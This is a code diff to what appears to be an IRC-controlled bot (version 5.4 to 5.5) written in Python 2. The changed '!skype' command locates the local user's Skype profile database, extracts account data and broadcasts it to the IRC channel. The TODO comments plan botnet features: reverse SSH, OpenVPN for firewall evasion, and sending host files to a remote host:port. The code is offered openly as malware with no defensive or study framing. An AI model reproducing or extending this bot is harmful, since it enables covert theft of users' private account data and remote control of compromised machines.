@@ -21,18 +21,21 @@ from StringIO import StringIO
 
 from modules.logging import logfile, log
 
-#TODO: make skype.findProfiles select the largest main.db, instead of failing if there is more than 1
+#TODO: make portscan timeout or cancellable
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 #TODO: modules:
 #       download    will download the file at the given url and save it to the host machine
-#       ports       does a quick port-scan of the system ports 20-1025
 #       send_file   streams the file on the host computer to the given host:port
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
+#       reverse ssh ssh botnet implementation
 
-version = "5.4"                                                   # bot version
+version = "5.5"                                                   # bot version
 
-#logfile(filename="bot_v%s.log" % version)                         # redirects bot output to logfile
+try:
+    logfile(filename="bot_v%s.log" % version)                         # redirects bot output to logfile
+except Exception as e:
+    print e
 
 log("[*] IRC BOT v%s" % version)
 
@@ -553,11 +556,11 @@ if __name__ == '__main__':
 
                         elif content == '!skype':
                             try:
-                                broadcast(skype.findProfiles(local_user))
-                                db_path = skype.findProfiles(local_user)
-                                for line in skype.skypeProfile(db_path):
-                                    broadcast(line)
-                                    sleep(1)
+                                output = ""
+                                for line in skype.skypeProfile(skype.findProfiles(main_user)):
+                                    if line[:3] != "['/" and line != "[*] -- Found Account --":
+                                        output += line
+                                broadcast(output)
                             except Exception as error:
                                 broadcast(str(error))
 
